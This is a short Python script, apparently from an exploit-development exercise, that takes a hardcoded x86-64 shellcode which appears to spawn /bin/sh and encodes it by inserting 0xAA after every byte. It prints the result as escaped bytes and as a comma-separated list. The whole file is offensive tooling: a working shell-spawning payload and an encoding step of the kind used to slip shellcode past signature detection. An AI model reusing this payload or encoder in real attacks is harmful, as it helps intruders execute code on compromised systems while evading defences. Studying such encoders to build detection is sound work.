#! /usr/bin/python
# Python Insertion Encoder

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

encoded = ""
encoded2 = ""

print("Encoding shellcode...\n")

for x in bytearray(shellcode):
    # Insertion Encoding

    encoded += "\\x"
    encoded += "%02x" % x
    encoded += "\\x%02x" % 0xAA

    encoded2 += "0x"
    encoded2 += "%02x, " % x
    encoded2 += "0x%02x, " % 0xAA

print("Verison 1:", encoded, "\n")
print("Verison 2:", encoded2[:-2], "\n")

print("Len: %d" % (len(shellcode) * 2))